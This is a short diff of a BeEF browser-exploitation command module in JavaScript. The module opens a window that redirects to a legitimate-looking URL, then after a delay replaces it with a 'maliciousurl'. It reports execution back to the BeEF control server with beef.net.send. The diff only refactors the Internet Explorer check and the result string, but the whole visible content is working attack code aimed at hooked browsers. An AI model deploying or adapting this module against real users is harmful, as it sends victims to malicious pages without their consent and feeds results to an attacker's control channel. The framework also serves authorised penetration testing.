@@ -21,12 +21,11 @@ beef.execute(function() {
 
 	function doit() {
 
-		if (navigator.userAgent.indexOf('MSIE') == -1){
+		if (!beef.browser.isIE()) {
 			w = window.open('data:text/html,<meta http-equiv="refresh" content="0;URL=' + realurl + '">', 'foo');
-
 			setTimeout(donext, 4500);
-
 		}
+
 	}
 	function donext() {
 		window.open(maliciousurl, 'foo');
@@ -34,5 +33,5 @@ beef.execute(function() {
 		once = true;
 	}
 	doit();
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, "Command executed");
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Command executed");
 });
